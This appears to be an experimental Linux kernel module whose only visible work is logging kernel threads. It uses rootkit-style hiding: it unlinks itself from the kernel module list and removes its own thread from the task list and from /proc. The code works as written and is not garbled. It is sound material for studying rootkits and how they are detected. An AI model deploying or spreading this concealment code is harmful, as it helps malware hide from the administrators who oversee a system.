#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sysfs.h>
#include <linux/kobject.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>

#define prev_task(p) \
	list_entry_rcu((p)->tasks.prev, struct task_struct, tasks)

extern void remove_module(struct module *mod); 

static void hide_module(void)
{
	struct module *curr_module;
	mutex_lock(&module_mutex);
	curr_module = find_module("hide");
	remove_module(curr_module);
	printk(KERN_INFO "deleted\n"); 
	mutex_unlock(&module_mutex);
}

static void hide_task(struct task_struct *task)
{
	struct task_struct *prev = prev_task(task), 
		    	   *next = next_task(task);
	char dir[100]; 
	int pid = (int)task->pid; 
	
	/* remove pid from procfs */
	sprintf(dir, "%d", pid); 
	printk(KERN_INFO "------------PID = %s\n", dir); 
	remove_proc_subtree(dir, NULL); 
	remove_proc_entry(dir, NULL); 
	list_del_rcu(&task->tasks); 
}

static int print_kthreads(void *data)
{
	struct task_struct *p;
	int count = 0; 
	while (1){
		if (kthread_should_stop())
			break; 
		if (count % 20) {
			msleep(1000);
			count += 1; 
			printk(KERN_INFO "count = %d\n", count); 
			continue;
		}
		printk(KERN_INFO "Now print all kthreads...\n");
		for_each_process(p) {
			if (p->flags & PF_KTHREAD)
				printk(KERN_INFO "[task] pid = %d, comm = %s\n", p->pid, p->comm); 
		}
		count += 1;
	}
	return 0;
}
struct task_struct *thread; 

static int __init hide_init(void)
{
	thread = kthread_run(&print_kthreads, NULL, "hide");
	hide_module(); 
	hide_task(thread);
	return 0;
}

static void __exit hide_exit(void)
{
	kthread_stop(thread);
	printk(KERN_INFO "Goodbye, world 2. \n");
}

module_init(hide_init);
module_exit(hide_exit); 
MODULE_LICENSE("GPL");
